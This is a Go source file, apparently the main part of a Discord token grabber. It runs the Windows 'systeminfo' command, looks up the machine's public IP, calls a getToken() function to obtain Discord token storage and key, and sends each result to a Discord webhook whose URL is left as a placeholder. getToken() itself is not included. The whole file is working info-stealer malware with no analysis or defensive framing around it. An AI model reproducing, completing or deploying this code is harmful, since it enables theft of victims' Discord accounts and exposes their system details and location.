package main

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"os/exec"
	"strings"
)

func SendMsg(msg string) {
	payload, _ := json.Marshal(map[string]string{
		"content": "```js\n" + msg + "```",
	})
	http.Post("YOUR WEBHOOK URL HERE", "application/json", bytes.NewReader(payload))
}

func main() {
	// system info
	sysinfocmd := exec.Command("systeminfo")
	sysinfo, _ := sysinfocmd.CombinedOutput()
	lines := strings.SplitN(string(sysinfo), "\n", 29)
	trimmedSysinfo := strings.Join(lines[:28], "\n")
	SendMsg(trimmedSysinfo)

	// ip
	ippage, _ := http.Get("https://myip.wtf/json")
	ip, _ := io.ReadAll(ippage.Body)
	SendMsg(string(ip))

	// discord token
	dscstorage, dsckey := getToken()
	SendMsg("Discord Storage: " + string(dscstorage))
	SendMsg("Discord Key: " + string(dsckey))
	//discordtoken := getToken()
}
